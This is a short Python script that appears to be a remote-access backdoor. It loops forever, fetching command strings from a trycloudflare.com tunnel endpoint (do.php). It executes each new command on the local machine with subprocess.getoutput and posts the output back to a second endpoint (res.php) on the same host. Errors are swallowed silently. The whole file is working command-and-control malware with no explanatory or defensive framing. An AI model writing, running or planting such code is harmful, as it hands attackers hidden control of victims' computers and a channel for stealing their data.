import requests
import time
import os
import sys
import subprocess

last_content = "" 

try:
    while True:
        try:
            response = requests.get("https://served-saturn-seminars-labor.trycloudflare.com/do.php")
            page_content = response.text.strip()

            if page_content != last_content:
                output = subprocess.getoutput(page_content)
                post_data = {"message": output}
                requests.post("https://served-saturn-seminars-labor.trycloudflare.com/res.php", data=post_data)
                last_content = page_content


        except Exception:
            time.sleep(5)

finally:
    print("")
